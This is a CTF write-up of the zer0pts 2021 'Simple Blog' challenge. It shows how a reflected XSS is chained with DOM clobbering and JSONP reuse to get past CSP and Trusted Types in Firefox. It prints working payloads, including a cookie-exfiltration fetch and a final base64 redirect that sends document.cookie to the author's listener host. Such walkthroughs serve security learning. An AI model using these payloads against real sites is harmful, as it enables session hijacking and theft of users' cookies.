# Simple Blog
---
>Now I am developing a blog service. I'm aware that there is a simple XSS. However, I introduced strong security mechanisms, named Content Security Policy and Trusted Types. So you cannot abuse the vulnerability in any modern browsers, including Firefox, right?
>[Challenge](http://web.ctf.zer0pts.com:8003/)
>
>[simple\_blog\_1802a68a066b0286632ecb1713377283.tar.gz](https://nyc3.digitaloceanspaces.com/zer0pts-ctf-2021/da11dbf4-c0f1-4663-9726-6d612529ae22/simple_blog_1802a68a066b0286632ecb1713377283.tar.gz)
>Author: st98 

This was a cross-site scripting challenge involving a CSP bypass via DOM clobbering and JSONP.

---
# Initial XSS
After initial viewing of the website, the only functionality appears to be toggling the theme between light and darkmode. This can be supplied via GET parameter `theme`. The parameter is inserted into the html without any sanitization.

If the theme parameter is set to `dark.min.css"><u>test123</u>`, we can achieve XSS.
![](https://i.imgur.com/5XWScD7.png)

However, due to the Content Security Policy, exploiting this vulnerability will not be trivial.

`Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-Y0npz+Y+M1cF2SWvRCo60NKRl60=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default"`

We can not access any outside resources, unless our script has the correct nonce, which changes every request, making it near impossible to guess.

---
# Reading the source
The `index.php` page uses an internal api to render its articles inside of a script tag. In the CSP, `script-src` is also set to `strict-dynamic`, meaning that all scripts loaded by this script will be run.
```js
<script nonce="<?= $nonce ?>">
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
    </script>
```

If we access `/api.php`, it will return a js function called `render`
![](https://i.imgur.com/zaQtFBk.png)

Because this is JSONP, we can create our own function name, by accessing `/api.php?callback=<name>`

JSONP is defined as:
```js
const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };
```

And called as:
```js
jsonp('/api.php', window.callback);
```

If `window.callback` exists, jsonp() will access `/api.php?callback=<name>` with \<name\> being whatever the value of `window.callback` is. If `window.callback` does not exist, it will just access `/api.php`, giving the default function name of render().

## Bypass #1

We can use DOM clobbering to create `window.callback`. By injecting `<a href="a:alert();//" id=callback></a>` into the html, `window.callback` becomes `a:alert();//` and the script should call jsonp('/api.php', 'alert();//'), which will run the script returned by the api, and should execute an alert().

However, we are instead met with this error in the console.

![](https://i.imgur.com/RAvsXug.png)

This is because of the following js:
```js
    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }
```

We can bypass this with more DOM clobbering. My understanding of this step is not perfect, but by injecting `<form id=trustedTypes><input name=defaultPolicy></input></form>` into the HTML, we now have `trustedTypes.defaultPolicy`, allowing us to bypass the trusted types check on firefox.

With `"><a href="a:alert();" id=callback></a><form id=trustedTypes><input name=defaultPolicy></input></form>`, we can trigger an alert.
![](https://i.imgur.com/tYH0fEs.png)

However, attempting to change the value of callback to `a:fetch('http://downgrade.ml:4444/x?flag=' + document.cookie)"`, we are met with another error.

![](https://i.imgur.com/5NKfIMu.png)

## Bypass #2

Looking at the source of `api.php`, we see:
```php
if (strlen($callback) > 20) {
  die('throw new Error("callback name is too long")');
}
```

We are limited to just 20 characters. Instead of trying to write the worlds smallest XSS exploit, we can instead look towards code reuse. 

The api has a character limit, but the json() function does not. 

The jsonp() function will create and append a script source into the document, with the source being whatever argument is supplied. Through even more DOM clobbering, we can create a script element with the source as our own server, allowing for exfiltration of the admin cookie.

By creating an HTML element `<input id=X value="http://downgrade.ml:4444/x"></input>`, and changing `window.callback` to `<a href="a:jsonp(X.value);" id=callback></a>`, the script will call `jsonp("http://downgrade.ml:4444/x")`. 

By starting a listener and sending the payload to the admin bot, we get a connection.
![](https://i.imgur.com/DnnAppr.png)

## Exfiltration

By changing the value of `X` to `data:text/plain;base64,bG9jYXRpb249Imh0dHA6Ly9kb3duZ3JhZGUubWw6NDQ0NC94P2ZsYWc9IiArIGRvY3VtZW50LmNvb2tpZQo=`, we can change the `document.location` to my own server. The base64 decodes to `location="http://downgrade.ml:4444/x?flag=" + document.cookie`, meaning that the user will be redirected to my server, with a GET parameter of their cookies.

After sending the final payload `theme=dark.min.css"><a href="a:jsonp(X.value);" id=callback></a><form id=trustedTypes><input name=defaultPolicy></input></form><input id=X value="data:text/plain;base64,bG9jYXRpb249Imh0dHA6Ly9kb3duZ3JhZGUubWw6NDQ0NC94P2ZsYWc9IiArIGRvY3VtZW50LmNvb2tpZQo="></input>`, we are met with: 
![](https://i.imgur.com/EVJP5Kg.png)
